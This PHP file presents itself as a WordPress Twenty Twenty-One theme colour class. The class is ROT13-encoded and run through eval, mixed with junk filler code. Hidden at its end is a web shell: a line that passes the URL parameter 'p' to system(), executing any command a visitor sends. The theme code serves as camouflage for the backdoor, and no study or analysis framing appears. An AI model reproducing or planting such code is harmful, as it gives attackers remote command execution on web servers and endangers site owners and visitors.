<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Phfgbz Pbybef Pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gjragl_Gjragl_Bar
 * @fvapr Gjragl Gjragl-Bar 1.0
 */

/**
 * Guvf pynff vf va punetr bs pbybe phfgbzvmngvba ivn gur Phfgbzvmre.
 */
pynff Gjragl_Gjragl_Bar_Phfgbz_Pbybef {

	/**
	 * Vafgnagvngr gur bowrpg.
	 *
	 * @fvapr Gjragl Gjragl-Bar 1.0
	 */
	choyvp shapgvba __pbafgehpg() {

		// Radhrhr pbybe inevnoyrf sbe phfgbzvmre & sebagraq.
		nqq_npgvba( 'jc_radhrhr_fpevcgf', neenl( $guvf, 'phfgbz_pbybe_inevnoyrf' ) );

		// Radhrhr pbybe inevnoyrf sbe rqvgbe.
		nqq_npgvba( 'radhrhr_oybpx_nffrgf', neenl( $guvf, 'rqvgbe_phfgbz_pbybe_inevnoyrf' ) );

		// Nqq obql-pynff vs arrqrq.
		nqq_svygre( 'obql_pynff', neenl( $guvf, 'obql_pynff' ) );
	}

	/**
	 * Qrgrezvar gur yhzvanapr bs gur tvira pbybe naq gura erghea #sss be #000 fb gung gur grkg vf nyjnlf ernqnoyr.
	 *
	 * @fvapr Gjragl Gjragl-Bar 1.0
	 *
	 * @cnenz fgevat $onpxtebhaq_pbybe Gur onpxtebhaq pbybe.
	 * @erghea fgevat (urk pbybe)
	 */
	choyvp shapgvba phfgbz_trg_ernqnoyr_pbybe( $onpxtebhaq_pbybe ) {
		erghea ( 127 < frys::trg_eryngvir_yhzvanapr_sebz_urk( $onpxtebhaq_pbybe ) ) ? '#000' : '#sss';
	}

	/**
	 * Trarengr pbybe inevnoyrf.
	 *
	 * Nqwhfg gur pbybe inyhr bs gur PFF inevnoyrf qrcraqvat ba gur onpxtebhaq pbybe gurzr zbq.
	 * Obgu grkg naq yvax pbybef arrqf gb or hcqngrq.
	 * Gur pbqr orybj arrqf gb or hcqngrq, orpnhfr gur pbybef ner ab ybatre gurzr zbqf.
	 *
	 * @fvapr Gjragl Gjragl-Bar 1.0
	 *
	 * @cnenz fgevat|ahyy $pbagrkg Pna or \"rqvgbe\" be ahyy.
	 * @erghea fgevat
	 */
	choyvp shapgvba trarengr_phfgbz_pbybe_inevnoyrf( $pbagrkg = ahyy ) {

		$gurzr_pff        = 'rqvgbe' === $pbagrkg ? ':ebbg .rqvgbe-fglyrf-jenccre{' : ':ebbg{';
		$onpxtebhaq_pbybe = trg_gurzr_zbq( 'onpxtebhaq_pbybe', 'Q1R4QQ' );

		vs ( 'q1r4qq' !== fgegbybjre( $onpxtebhaq_pbybe ) ) {
			$gurzr_pff .= '--tybony--pbybe-onpxtebhaq: #' . $onpxtebhaq_pbybe . ';';
			$gurzr_pff .= '--tybony--pbybe-cevznel: ' . $guvf->phfgbz_trg_ernqnoyr_pbybe( $onpxtebhaq_pbybe ) . ';';
			$gurzr_pff .= '--tybony--pbybe-frpbaqnel: ' . $guvf->phfgbz_trg_ernqnoyr_pbybe( $onpxtebhaq_pbybe ) . ';';
			$gurzr_pff .= '--ohggba--pbybe-onpxtebhaq: ' . $guvf->phfgbz_trg_ernqnoyr_pbybe( $onpxtebhaq_pbybe ) . ';';
			$gurzr_pff .= '--ohggba--pbybe-grkg-ubire: ' . $guvf->phfgbz_trg_ernqnoyr_pbybe( $onpxtebhaq_pbybe ) . ';';

			vs ( '#sss' === $guvf->phfgbz_trg_ernqnoyr_pbybe( $onpxtebhaq_pbybe ) ) {
				$gurzr_pff .= '--gnoyr--fgevcrf-obeqre-pbybe: eton(240, 240, 240, 0.15);';
				$gurzr_pff .= '--gnoyr--fgevcrf-onpxtebhaq-pbybe: eton(240, 240, 240, 0.15);';
			}
		}

		$gurzr_pff .= '}';

		erghea $gurzr_pff;
	}

	/**
	 * Phfgbzvmre & sebagraq phfgbz pbybe inevnoyrf.
	 *
	 * @fvapr Gjragl Gjragl-Bar 1.0
	 *
	 * @erghea ibvq
	 */
	choyvp shapgvba phfgbz_pbybe_inevnoyrf() {
		vs ( 'q1r4qq' !== fgegbybjre( trg_gurzr_zbq( 'onpxtebhaq_pbybe', 'Q1R4QQ' ) ) ) {
			jc_nqq_vayvar_fglyr( 'gjragl-gjragl-bar-fglyr', $guvf->trarengr_phfgbz_pbybe_inevnoyrf() );
		}
	}

	/**
	 * Rqvgbe phfgbz pbybe inevnoyrf.
	 *
	 * @fvapr Gjragl Gjragl-Bar 1.0
	 *
	 * @erghea ibvq
	 */
	choyvp shapgvba rqvgbe_phfgbz_pbybe_inevnoyrf() {
		jc_radhrhr_fglyr(
			'gjragl-gjragl-bar-phfgbz-pbybe-bireevqrf',
			trg_gurzr_svyr_hev( 'nffrgf/pff/phfgbz-pbybe-bireevqrf.pff' ),
			neenl(),
			jc_trg_gurzr()->trg( 'Irefvba' )
		);

		$onpxtebhaq_pbybe = trg_gurzr_zbq( 'onpxtebhaq_pbybe', 'Q1R4QQ' );
		vs ( 'q1r4qq' !== fgegbybjre( $onpxtebhaq_pbybe ) ) {
			jc_nqq_vayvar_fglyr( 'gjragl-gjragl-bar-phfgbz-pbybe-bireevqrf', $guvf->trarengr_phfgbz_pbybe_inevnoyrf( 'rqvgbe' ) );
		}
	}

	/**
	 * Trg yhzvanapr sebz n URK pbybe.
	 *
	 * @fgngvp
	 *
	 * @fvapr Gjragl Gjragl-Bar 1.0
	 *
	 * @cnenz fgevat $urk Gur URK pbybe.
	 * @erghea vag Ergheaf n ahzore (0-255).
	 */
	choyvp fgngvp shapgvba trg_eryngvir_yhzvanapr_sebz_urk( $urk ) {

		// Erzbir gur \"#\" flzoby sebz gur ortvaavat bs gur pbybe.
		$urk = ygevz( $urk, '#' );

		// Znxr fher gurer ner 6 qvtvgf sbe gur orybj pnyphyngvbaf.
		vs ( 3 === fgeyra( $urk ) ) {
			$urk = fhofge( $urk, 0, 1 ) . fhofge( $urk, 0, 1 ) . fhofge( $urk, 1, 1 ) . fhofge( $urk, 1, 1 ) . fhofge( $urk, 2, 1 ) . fhofge( $urk, 2, 1 );
		}

		// Trg erq, terra, oyhr.
		$erq   = urkqrp( fhofge( $urk, 0, 2 ) );
		$terra = urkqrp( fhofge( $urk, 2, 2 ) );
		$oyhr  = urkqrp( fhofge( $urk, 4, 2 ) );

		// Pnyphyngr gur yhzvanapr.
		$yhz = ( 0.2126 * $erq ) + ( 0.7152 * $terra ) + ( 0.0722 * $oyhr );
		erghea (vag) ebhaq( $yhz );
	}

	/**
	 * Nqqf n pynff gb <obql> vs gur onpxtebhaq-pbybe vf qnex.
	 *
	 * @fvapr Gjragl Gjragl-Bar 1.0
	 *
	 * @cnenz neenl $pynffrf Gur rkvfgvat obql pynffrf.
	 * @erghea neenl
	 */
	choyvp shapgvba obql_pynff( $pynffrf ) {
		$onpxtebhaq_pbybe = trg_gurzr_zbq( 'onpxtebhaq_pbybe', 'Q1R4QQ' );
		$yhzvanapr        = frys::trg_eryngvir_yhzvanapr_sebz_urk( $onpxtebhaq_pbybe );

		vs ( 127 > $yhzvanapr ) {
			$pynffrf[] = 'vf-qnex-gurzr';
		} ryfr {
			$pynffrf[] = 'vf-yvtug-gurzr';
		}

		vs ( 225 <= $yhzvanapr ) {
			$pynffrf[] = 'unf-onpxtebhaq-juvgr';
		}

		erghea $pynffrf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>